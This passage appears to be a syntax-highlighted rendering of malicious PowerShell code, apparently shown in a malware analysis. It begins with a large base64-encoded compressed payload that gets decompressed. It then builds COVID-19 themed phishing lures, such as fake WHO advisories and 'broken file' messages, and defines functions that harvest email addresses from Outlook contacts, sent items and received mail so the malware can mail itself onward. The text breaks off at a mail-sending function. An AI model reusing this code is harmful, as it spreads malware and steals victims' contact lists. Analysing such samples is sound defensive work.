P7X/e3/n/O2Xn84QQ+69ff7F3e8c7Na/d/5mffmLHvw+5WKHcqrXP/3y9zqfPvzBbLVa/+T15atv/2DyUz/15eXe7/XV8ulPffJ6Z/f5y/Py4Pph83u/Pn+Z/eDZs7356uDq5fG9B3tfrfbvrVbPLovnP/XJ9Ceu731xXBXzhz9xfn3v1Sf3fvo7s5OvFj/xk+fvvqjOf++dVwdvPtl7/e29F7/Xq72Hxcvv3m0Xb2erN7/Py0++0776ZPeyfFHlE3Ijz3ZOpgezy/2nr958594n9w4uV7/X/PLNp/s/vX/x/MvJZT1/8KZ4Vd7fP9j79Pxi8Yt+r5ffmfzg8osH9yc/9fL15dv8yY&#x27;</span>+<span class="string">&#x27;vL++ufvFzsfPn8YE1B/+c/cbDz1RcP1sWDX3Refuf3+e6TF0/uvskr8hl+0bv1we9NLPr7/MS3n33nF63L5RfZ7/V87+q79eRyr3hX/qJf9Oqnf5+f2H/6+1QPn5w+f3B58hMvv/Pk4rz89uXO3vWnRO3pl99uTj+5W+afPH9Hkv7u8t7k9/nBs1cnzyi98vTF2bvnl5cXs3l79eb+RfU8n6xfXJ68fPnTP/UTL1/Pf/ry7tOvfp+dX7TcP/3J6v7B7n3KrZ7kXz299/TB7OQnf++fuP/y/NlP7fw+b17/3r/P7r3ZSVs+fPIlGbD735kc/D6LGenK+w8XL/OTy3y//ons+cNJ9uy4PHjw6ZfL5cPZT9avDn7v+7v33r19/fzJ3S9+8svvPPlk5+m0PV9lX00ml/cOjp99Mskuf/LuV3fvHby6nCx/nxcvX37y3Zff+eTVlz+5f/kwvzonZ7c8+Mni5U+2P/WLDs7e7T34vYsflLODxcuD/O7v3ZzevSYHbaegldRPprPJOaU/vyCdcrCodz65urt/793z1X69+7I6r7Kr+tlPrVY/8eC7n/zkZXZCi5Qvnkzp73p+/tMVOdcvrxfPdyfn5WJ19/L+m7u/z93nDz85+L32JtcH2fm9B7tffHd3eVn+5Ff7P/2L8tXy1U++zV9cf/L898p+r7OTL19fLi6vdr96usrfFOW3n32yOPnpL5rvHH9R/t7r+0iQPrmYvDt/9clk9sm9H5QPKfHz5Xfuk9V89oPvLurn3y6/vZh8RVbm3qR9Ofni3U/9xOXqxYvn5Pz9YPnkq90n+fMHL++/yprT9eTug0+z6YP8avrtl6vnLxuyrfd+ar99c/3Td3eXn9z/vX7v+8er+mT68P63f+/JNbHou/2T1z/xgx/Ul7/3wfL+/u91NX9+9wf71bcp9Fv/4OCT7/zgF337HVnwsvm9P/1y5/mr9fX895l+8elldb47+fzTZ9NXv2j37bMnP/3Tv893Xs2W7fr5wdm9+z/xk6vfpzh/+fb4k7w6vyxfUvLm5fV07+ps8tNfla9efOfeV2ef/mD3zVc7Z3d3nn2ZPSubJ7sH5DJffjv/wXxGIy&#x27;</span>+<span class="string">&#x27;6/nP7eO+/qYvLyk09PXn6aEdjFT0zb7+x8++x1+3u9ab7Idtv693qS1cvJu7Pf+9PJT15+tS4vXu789H47Ozh7TqQrn1SLNz9xsN6ZPfy93hT7L/MZ8dkveveL7j7Pi6fHD6Y/OD+9d+8n7s/O62ZxTk7V3nFzdV4+Pf2pX7R39uD8ybNf9Ht/ufewvl4dfPLyzb1PPm32fu/jH0zuvSAt//m6bL+8e1U9+GKxKijdd323evHg4fLedUYq5/6nv/eLbK/9qbPm88t7D+e7lz+4end/9vscNOu7x1/VF+tXu5+v762n2eUnV08vL9+un+6c/N4PfvDJ81+0+4uqy939yy/L89/7/N6z+sGb777+Yv17taff+fIH937i3eefnF8eXL5ZP3yR/fTpk997/+z19Ve/z/Ltl5Rh2Tn77vWD8wcnd9f3LifPf/qT65/+ztnvVX76+vLg7e/9k/fXb9t7tIj0iz795E19/O3PX355+vZ+/eT+7/3m8/PJk/rJu7N782ftp5e7P/HFPWiZF6ufbGY7D54/KV/8Xq/v3z3fefdmp768fvFgLzt/fZFNm09Ov31wOb2/mrxeli9/7y8f/ESVfdH+1Py6er74ZI/W5c5Pd+/fvZevPn118OCTnZfzdw/OP1nem+STB2fNT36a32vv/hQt/Ez3Hr5dXj/48gcH18uHy4eUuM1/8Grv8jl57Kd7i/xB/uXB3bfNw3urH8wf3L08oaTD/bvNPZLfuy9eHlydf7p8ePfbl3fPXz745Oogf9n+9P2HFITkd2fL/O7i6cXOQ5rq57+IQpTZp/mbN5Nv15f3mgfrpz/9k59Ov/307sunn+y/eLj+qfOn1YNPzvbePLm3fvPTT3/Rpy9/sP597rcE4u2L63pv9oDA5D+4XK5/YrJ/d2+2Nzn/qWq2fEJ4PKTltDfzh18+be8enJycv7l4sH6wc3X9E6uT3+f8y7v5gwY565cH+9Mvvk3+5b3m7g8uXj5/+O2TF18Ud7948YDIun7wCeW3H/KazqfT05PF3ebzLy5/0Ysny/yT8zdk7h588uztF8vLq8+vZw8+/27xgJZ/Lu61nz6dfHv15d031wezH5Ai+qmLh+uXBxeX9+9Sivvy3uzy98lpteb3Of+JVfWUEuZPP3n44vj83hsa9P179W5z/oPJLJ88+fYZrUPt/z4vf+rB5auLF2RiFw/3Jg9efPrTP3335cPl7/PFtz/JiGh3p18eXL67yJcUKNYP7x58+8mnlz99OVt+snOw/vbdT6YndyeL8x98fn3+4JMHp5+TO35MBJ4+3HuKZPuXP/&#x27;</span>+<span class="string">&#x27;Hm1cMvZvXvNaPc1A+uz5dPl5Qzutt8+8srig+vf+/dL67PSGR+8GB2+VMPy/wHX2aUa8kv6y/uEcWb0/19ij0fvPg2RTm0zPTiB0V+/ubyxcuHd7/z4MXxD07uPvzy2w8/+emfvvcTs1NaUfzybr374HTn+Vvyi37wyd1ZNf3u73358mSa7fxer1781MX0wf135Yvd80+f3j359rPnsy++Tczy8HJ27wd7s/vNi3px9yE5JM/vkd909fnDL9r1+ZsnNJ9PPn/26U/R/F3lb+6Sd5P9Pj9Y7uU/yL/8aufdy/x85/TZeTv58my9WH5+8cne099r+e74&#x27;</span>+<span class="string">&#x27;8y/vTj8pJ7N732lW5/ev7u4Vz19UV9++XL6jZYBPDr79ydWb8t2Xd1+++cHqdZXf2z/e/fLui+zbP31vtl/uPpg/yx++e3iwXub5af7ycufB5U9RzExJZMrL/j4vf/CG4NHkLBtaDP3O7zW7+/Dgk+W732v/wd53X1//xP13+8137rb3PyFCP/i9vv3qC7LyZ2W1/OTgE1pCXs/u/T53z39qXu5NP13u3Lu8/+35t6+WX8x33n558Akpt3zy7eef7L98dzG5W1/tf/vTveUP9i7an1yd0GrNk4v7e0/ffFqef1p9+fscLK+uLycHPzj7NNt/cX/v9eWXD79sKGX/5P4LEsSdg8vnD5+ff/v+1Rffbs+ePl0+/Omfevkg3118QoK6ell/+9XVQ5KiV/vzGa0trCfndz9&#x27;</span>+<span class="string">&#x27;99eDd7j1KInz57fXFw3sP7u+9evGD+UF+/Py70+z5T708++Jg9VP1u5dXy6eXxz+x9/l3To4fLJ7uH7y8f3d6vL+32Nmf3v/p3/vL3&#x27;</span>+<span class="string">&#x27;/veTx8sv5iQgSGfffnJ5N63f/oH03v3H36C5eL16rz9qebVLn1MqegHP/1TT79DefovZuendfNidnn+g6/Kzx/sHHz5g/ndL2lhkzLW9xcv7++QUvlpWpPeffl099XLbz/96YdXP3F3dfLJL3oy+4J45/zl+gEtOp4t77Y/uJofv7l8ePcnXqze/uCTi9efX1ydzj/5qU+ePvhFp/cv3zyhmO7hwZdP5z+o3v0+B5SSe3uwJFflwUOSr8V3nnznp16uFtNTEr+H7+5/OXvw8uG91+V39j7/weX++eKLn/rOp28Xv+jNw3vVi9XLn748v/dTd2fnPyjmO7Pjl4u3WfZk9nt9t7n64vWs/M7JJ9NvP7lPrP2D6uXq3k+/evATL1/sffHF5d7Te9ly52774Kt3Z1cXdfn8F1XfPd3//OT3/r2ePvipl/d/uj1dXzYvr1/vkeE9n75YP3i1c/Kdszdnr6sni1X7YrH8zmnxZo/yOfd+6geL3+enswdLIs2D9c6b6uDqy+9cXv7Ei4vpDvl5Z9/59t0HD0++ejE/+amdn/rkbn51fvkTywcnGblMP/3Tey9/r3uk87+zf/+nP1ke/KLJm8mr35uy1T/96svr12/rH5x/u757Nr33+Sf5/bd37z5YX71+c075jE/ITn5y95PF0xNKae6sLl6+LH7vX/RyeXH80z+9+H2+Ov3kfGdOkO/fa96WT9en99evfp8vHlzPP32Tf7t8mhc/+dPNveWn+U89fP17zZ7W979zdb7z9sXzFzNK0F6+fruY/dT5VzNaFvty9vrh3e8uvnv6+t6916fT18/fnF1//tPNy5+6omWMxU+9/anL598pv3jz9iz/fOf13i86+fT0bVb+1E/MVt+Z7nznwbcfzp8/ffn696Z5vjy//r1/4hc1P7jLKwPPVmc/cX7v5IvduyfLd1cNRcp7r6cP1rsvf6pevznYLb9s7pH9uniwS+7zwU+8mv/E2fr3yT/5Rd9+9WBv+vt854vl88vf+4vrn/i927cvnzyY3rv+7udn569WF81PL+5RQuLtT9z7oil3i5/+ffK3Jxdlezb/zu7L7+xN3z78weWD2YPJd36y+TSfnFDerVntf3X93d+HqHj13U/33u6cPjld3p0t7r37vZ585/7i6Q9evKaQ4N63393/4vf67mJv8e7gJ/buf37wpn7xg6rNl83dnYcHxxc/9fZ4SX7OF0+/WDSnp2U1f7k/I/9+p/x9KL14SvL5+vfZe3VcPP/2wf7x77PfvnjwhMb34iTPF5//1NuXzfzbeye/98O339779GD/pLn7e50vd/beLe/ev/r81avs+KeW93+vtz84f/jwyydPXs1/evry0/P755c/vXr55mzx4st6Nt2jNOj+y+bs97m6e/fN3ecHl19++9V3KAX76ve6fvKDy53dyzdvzn/q95otiRbvJl/81A/Ol28vvvPV2Xx2ufzq5Qmlght&#x27;</span>+<span class="string">&#x27;a4Dw4f/DFwfVXxeVPvfjOJ/lPfPL5m2c1JXYmD19+Z/nq8qf3fp8qv0tLpQe7VfFTdw+ov9mbu7MVpRZe/xTF5os3xTX5BU+vpy9/QPrw4cFd2J+DV6/vP&#x27;</span>+<span class="string">&#x27;3n7A0qkLt6Skjt/8OTi7vrNvXPyWS6uF2c/1b74KTLLD754lr8qflF+/2X5ZvqLnlXP3759ff3ydf7mk09ezV/PfmJ1/BO0aPy8uniwN7u4Kh9+cb95vT+9+PLtdX2//L1+8IPf+6cfPH96b7L38NPjveI8X777zsO3BxRH3zv4cjo7vvvi07MvfurT3/snsv2Xe2Rjryl7uPPwavHpp9P7d3+fWT57M63KvZcP9u4tqL83n//Ey7NXq7fnv9fv84O3v+j3+fZ3vvPypx6eHTcv39DazPOH872D4rsX1+3yq3c/NX97+cUX5Od+8qalSXtVf+f3fnr/4fo4n1CQuD//6vXn50/q64O3y5dkfc+v7+bLn3r2cm919aqcvX2Qf3L88vr4oJguv0vLkQ+at/P8zU88eLqzXx0f5Dsvf7oq3t07O9n96Wp/svft1bePl+XpzuK8Jg9mZ3b59s2rL4rpaf7gO5++2X1Tffs7P/j04ge0wLK/e+/1cv3m5OVP/WD99roq8gc/fe/3IV/o1Wo+ncyeXz65/olvf+fLN18tXly9+/Ridfn21Vk5vfeTl3fvXn0y/84Xn36n/e5P/sTdnz57/uQHP1GQb5O9uHhZPV1/54RWY+7/4M189cXJ2du7Lw92du7ee0j0PiB1UPzUq28/WXzy+uDy+qvs9MXvlb+8mz9v33z3ZfX281/0Uw8f/sRqtyKPdG/2e3/y+t7rF+VPHD+lhZ37Ba2SXB88bVcPv7OzKs6LL559cfpVtpwvaXHu/ttXb7/zg++8Pn17/vTl9Vc7F2evJw8vlwfn07c/cX38yd37d+udb9ff+cnvLNafvrm38+LLe9/5iekXs+8091+cPrz&#x27;</span>+<span class="string">&#x27;44oud6rufnP3el6/fPHzRPp3OX3758u7eV7Mvfu+n936fFz/15qd/ovyJ3+cnfvCi+O7y9Gm9vji7unf6ZjlZ/tS3s/Xb858++4lZPSG1f77z8OzJ+u7TBw8XP/WyfXe3Of7i1d4XlxfrN/tv3xXPKPSeXbx8eDCf/96vX+5+QUuJP5jnX149/M7v9YPdgy9Pfu/rt08K8pmfXE7XB0+evfy9396rdx7uX1bffvfs7tvrn3py+XZn7zslZWN/QAHI3e+8mn76kLLXT/fvV/dfXc0pLrxY/973iu9O7j+43Pn2293dX/Tl/NvQg59c33/9xem7t5+crGn8P7ja3yOX6fXOD+69/eKnH5x+e/8ndsiZ+72efaddPf1F37l+/e2zFy+rn/rBT/yi+z91TksU809Prn+v1z/9i56cF9cVObx3yWjNHzSnXz04ffHt9en19MuH+b3Lq1WWn7+t99+2v/frq+Lgbfl8cnZvj/JFtCbx4O3x5N3vc/z83dlPXOW0+Pfi7ODN5du7n/zU/U9/4uwXfb74JL8mm3M2X7w7/fztT5Lv9vps2by9/+zTL5+W+6+/XC2f7ew/+UWv9op7P3H66sHFs/tfvfyJ3yv7vcvrH/w+5dsXpxRxTb86frgzb+9/+fqrnU8u3754cvrk9/q9ji/23nx6/van3y7mxUn56qfPXr4pXpftg9m3f9HiK0ol/cTe2av98uG9d5+/vXxNAvzp009oreUHzeL3+fark535D45/8t3xs7ef7C8vs586O/+Jz8uX326uFyff+Sp/++31uzfX95+/qVf1kyLD4sbr9uXT1bff7kyL89+byP4TD4s3k/u/z/rVg9Nj8uF2Ds5PF9++d/3VtNh7PXv4Zvrui9kXn5xdnLz+Reurh/euv/3dt7PqJ0g+Xy+f7i+ef3t1/Huf/KLTt+3k8gdfnHz56vrk+Cd29l8++M63v/P2+Un25iW5sfuvPv3Ou8v9r754TTnl++W3p8ufPDv9osAglztfXj45Pv/21bcXy5/ae71//8l69rb5Rb/P29e/1+tXxbdfnF18cXFx+vT3pq4vfvrLky8We8/bb9dPH97/ieen2Sdfnd8rfq/izd3vvrss3xVfvfj&#x27;</span>+<span class="string">&#x27;iB09enLx4d1a2T14+PXnwav/3WV8fzNv8tHi7WLx+83v/5PP5T738znfmX1w8/86nn19cfP5Tv9dPvP7uu53v/ER1QGuUX81Ov5yfzb44vbp38GLn0+o7v/fi+P4zssun39mpfvDg7M2zZ9Wrdw/ukbP76qfvXjy/fHnv6uJkvvcTX3558eXr7yw+uf+qoHWPL/bPdx9+Mj9YLY9nDy5OH8xPr95+8uJkdn9GKwGvT3ZeNZRhvPvueDktPj9789OvF59c/0T97OnyxfWX9evnX16/er1Dvs5P3v/8O+Qd3PtF05en3977idMf5E/Imbm7/3vvFPeffjovV58vX//eP7g+frq/l+fzt9Xy9/ri4OTZV8c/OJ3u/dT6i7tPi2zxU9cnX6y/84NFtZjlV59Uv/fV6vd5MP/27/3txXH2sqCli7fZV7/356vr9XS+fvPdt8XJT7y4/vyT+29enO48ebJ69qC8V/30cn+1f35+8Mmr36f69k89f0kL/K+/2K/y2SfvfuL+6U+TUO00n5yfnhTHbz/5au/savru9O7LL65WL69/7y8nD5492zn+dPeLy+cvnr6+3H8y/6k3D1aff3vv9/ry+Xd+r7PjklzITz49u2q+eFA+fHd89VPTN09fkCU4vn/y5vw7By+e/qLq4OTLF9959+TBT3zyqsl+8unL7371E/PX2eIluatPf6/XOzunb89e5s9++mR6/2Ly4uVPfUKG9+1P/D5F+fI7FxSDf2fn9Vl1/fbbb7/98NMHn3y+fPblJ2/e/eDgyRfn+erL19++unjxE1ef/N4TchvfnL092y9f7p99dbb37Ph19WmT7eyv935R/va7X7x9+J3sO8f5wVMaYvvscv3F/ey79z9dvPvB4uWrn34+3fvO5KQ9e/V7ETW+pPjjXjNfv/rp1S/6zqd58+Qnfu/s/nd++icevjh4WtC68ax4+/bs4vhNvji4l+/89PrbP708ePjp7/P2B78XuQEnz89+4geLZXF8sP/20+qnm/n+TzydLs8ekP+0nhavv/q9n3x++ur3eTV7d/fJydvf64uTr37qLFv+5N5Pv/uJ785fv3u7fzVvpz997zvP7727Wv7g3dUXy9/rwZc/8fbtmzcvv/jy5KvPrz/P8x98/vv8oFhMvrP3evL09bPvPF8Wl9959+VPXJztfPKT++Wr17/PJz/xi+6Rm/Kdt9NX36nWJ995/nzn/vGb9vTdtyke2Ls4+c6Tg+OffP4Tz87efXn9E3vzyfFPPrv75Rtan3r1+xz8xOn9s89ff5I9eba7vHf1RTNfnH5+d/c+5Vquzk7PT1/X7769/+b1u9Pz8he9Oy3Ov5r/oie/95OvTn968qZ5vbr+fe7t55evTh4+fL16t798sD//bvZTT769evp7/8S9hy/fPt/Z/8716U9f7mcH99/t/V4/1Tx5dv/e5duCVNuT5+3zq1n15buv5m9evXhIPvRP3N35fa7JzF9c3P3qNFtOv7P+farjb5ffoQXk3U9eXix+r9/r6vf+qesVRe1fPDjLn50cXEy/eDZ9O394fPfyB0/f/OCT2Q9ePXn31ee/19nv3e78dLX&#x27;</span>+<span class="string">&#x27;zZXbx7ifePKGg44xI/vTgYPWTO199/nLZHv8+11+8+87l3rMvz746nazyL36wvvqE1PX14ovyJ8++fDCt3hVfPn3y+cPLr16unpz/9HXx5AckL7/35duHL774dvPV+qfePKme/D7llFL298vVT1yeLX/y2wf1d5/TWtjrFy+ffP7t1e/19PV3F4vf6/c+/fQXvfr89zo9fnB27217Olutq8liunf27t7dt0/PHhzMl89mT65evS0fvP5FZ/eL+3vz6f1PZq/ufXn+7uTp5RfNvZPm8qv81ZPZ26++WHz1E2dX1Xd/ryfl1eT+7/Xq/oPPKd57vXhw/NW0/L13Xj87OLv4zo&#x27;</span>+<span class="string">&#x27;O9T3/iujxblO319Ntf/F7Nt8/PfuI7J0X1k1ev9t5Mrs9P3u7+xNN6f/8nXhRPZs8pX3z23eoX/cT0Oz/RVLOT5z99/vs83F/cffPs+ao83/npZ1e7Jxffef17tQ+fHX/5E9/e+Wpn/jzfPb63+/Jqevf+5U+c3//ppz/x7VdfPX1QvHy3zO8fFJP6+m67k1Mc/AXl&#x27;</span>+<span class="string">&#x27;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&#x27;</span>+<span class="string">&#x27;/97n3lvE/VfzvGfzfvqOEB4WOX+18+/LLT34w+b1+r2/fe/XyJ777ev3TD89e3P/8yWz37g/uffv8F529WV++++T3enG9mD+8IjP/7vfeuVe9zFdnr6efPr9a1vXsJ9DvwSvq9/net88vmki/9+69Ibzvvjk5WL2ifj89uffV6bcvX+bvuN+ru2d71O+bh/sv9t9e1Z8+fLrz7fPsi9d71U+f7+7+5AnN187Mn69K5+vg1eQX/V5PKbM5bcsXTx7Q+uTz79By9unnD1//RH7w4H7Z/KLqfHZ6MAetd+aE07N7v/ek2nn13d/n3u99Qvr4YDn5qcVytX/5ky8/X/9e98ts/5PlcXvv+d5PXC5+qnx39fyT4++8uZxnxz95/yfP75NYL68/WXy7Ps2e7ezNrmar47tPviyvzlYPv9qdkS746vOzb19l7U9QHusr8rSr9dlPrj+5fPr7zJ7Onz1/QN7Gm4ezYv/5vcndt+VdrGUdPP34Dj2j9HtnX45PqsWqzpumqJb+719Us/z7jx49zaf6Gbd/k79rx6dLkp1ieUFfH78+OTu7c2f8Ks9mb6rT5WyL/qjzVZlN862PjvX5aPS7kYMz/f3boi1z7/sn+tjvCbr39TQrp+P8XU5fz2b57z9dzO78xsnW71a357//nPrL60/w+7hZT5q2Jny27t258zPVut0+L8o83c4VzTRrpkWR/m5Z2/7+1MtvnPzGyf8D&#x27;</span>)))), [<span class="type">IO.Compression.CompressionMode</span>]::Decompress)), [<span class="type">Text.Encoding</span>]::ASCII)).ReadToEnd()</span><br><span class="line"><span class="variable">$global:contacts</span>=<span class="selector-tag">@</span>()</span><br><span class="line"><span class="variable">$global:sent_tos</span>=<span class="selector-tag">@</span>()</span><br><span class="line"><span class="variable">$global:recv_froms</span>=<span class="selector-tag">@</span>(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="variable">$global:mail_pools</span>=<span class="selector-tag">@</span>(</span><br><span class="line">(<span class="string">&quot;The Truth of COVID-19&quot;</span>,<span class="string">&quot;Virus actually comes from United States of America&quot;</span>),</span><br><span class="line">(<span class="string">&quot;COVID-19 nCov Special info WHO&quot;</span>,<span class="string">&quot;very important infomation for Covid-19</span></span><br><span class="line"><span class="string">see attached document for your action and discretion.&quot;</span>),</span><br><span class="line">(<span class="string">&quot;HALTH ADVISORY:CORONA VIRUS&quot;</span>,<span class="string">&quot;the outbreak of CORONA VIRUS is cause of concern especially where forign personal have recently arrived or will be arriving at various intt in near future.</span></span><br><span class="line"><span class="string">see attached document for your action and discretion.&quot;</span>),</span><br><span class="line">(<span class="string">&quot;WTF&quot;</span>,<span class="string">&quot;what&#x27;s wrong with you?are you out of your mind!!!!!&quot;</span>),</span><br><span class="line">(<span class="string">&quot;What the fcuk&quot;</span>,<span class="string">&quot;are you out of your mind!!!!!what &#x27;s wrong with you?&quot;</span>),</span><br><span class="line">(<span class="string">&quot;good bye&quot;</span>,<span class="string">&quot;good bye, keep in touch&quot;</span>),</span><br><span class="line">(<span class="string">&quot;farewell letter&quot;</span>,<span class="string">&quot;&#x27;+&#x27;good bye, keep in touch&quot;</span>),</span><br><span class="line">(<span class="string">&quot;broken file&quot;</span>,<span class="string">&quot;can you help me &#x27;+&#x27;to fix the file,i can&#x27;t read it&quot;</span>),</span><br><span class="line">(<span class="string">&quot;This is your order?&quot;</span>,<span class="string">&quot;file is brokened, i canzT&#x27;+&#x27;F5nt open it&quot;</span>)</span><br><span class="line">)</span><br><span class="line"><span class="variable">$curr_date</span>=<span class="built_in">Get-Date</span> <span class="literal">-Format</span> <span class="string">&quot;yyyy-MM-dd&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_contacts</span><span class="params">(<span class="variable">$ol_folders</span>)</span></span>&#123;</span><br><span class="line"><span class="variable">$folders</span>=<span class="variable">$ol_folders</span>.folders</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$folders</span>.count <span class="operator">-ge</span> <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$folder</span> <span class="keyword">in</span> <span class="variable">$folders</span>)&#123;</span><br><span class="line">get_contacts(<span class="variable">$folder</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$item</span> <span class="keyword">in</span> <span class="variable">$ol_folders</span>.items)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$global:contacts</span> <span class="operator">-notcontains</span> <span class="variable">$item</span>.Email1Address)&#123;</span><br><span class="line"><span class="variable">$global:contacts</span>+=<span class="variable">$item</span>.Email1Address</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_recv_froms</span><span class="params">(<span class="variable">$ol_folders</span>)</span></span>&#123;</span><br><span class="line"><span class="variable">$tcount</span>=<span class="variable">$ol_folders</span>.items.count</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="variable">$tcount</span>;(<span class="variable">$i</span> <span class="operator">-gt</span> <span class="number">0</span>) <span class="operator">-and</span> (<span class="variable">$i</span> <span class="operator">-gt</span> (<span class="variable">$tcount</span><span class="literal">-500</span>));<span class="variable">$i</span><span class="literal">--</span>)&#123;</span><br><span class="line"><span class="variable">$item</span> = <span class="variable">$ol_folders</span>.items.item(<span class="variable">$i</span>)</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$global:recv_froms</span> <span class="operator">-notcontains</span> <span class="variable">$item</span>.SenderEmailAddress)&#123;</span><br><span class="line"><span class="variable">$global:recv_froms</span>+=<span class="variable">$item</span>.SenderEmailAddress</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_sent_tos</span><span class="params">(<span class="variable">$ol_folders</span>)</span></span>&#123;</span><br><span class="line"><span class="variable">$folders</span>=<span class="variable">$ol_folders</span>.folders</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$folders</span>.count <span class="operator">-ge</span> <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$folder</span> <span class="keyword">in</span> <span class="variable">$folders</span>)&#123;</span><br><span class="line">get_recv_froms(<span class="variable">$folder</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$regex</span> = [<span class="type">regex</span>]<span class="string">&quot;(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]&#123;2,4&#125;\b&quot;</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$item</span> <span class="keyword">in</span> <span class="variable">$ol_folders</span>.items)&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$m</span> <span class="keyword">in</span> <span class="variable">$regex</span>.matches(<span class="variable">$item</span>.To))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$global:sent_tos</span> <span class="operator">-notcontains</span> <span class="variable">$m</span>.value)&#123;</span><br><span class="line"><span class="variable">$global:sent_tos</span>+=<span class="variable">$m</span>.value</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$global:mail_pools+=,($item.subject,$item.body)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">f<span class="string">&#x27;+&#x27;</span>unction del_sendmail(<span class="variable">$name</span>,<span class="variable">$size</span>,<span class="variable">$flag</span>)&#123;</span><br><span class="line"><span class="variable">$ol_out</span>=<span 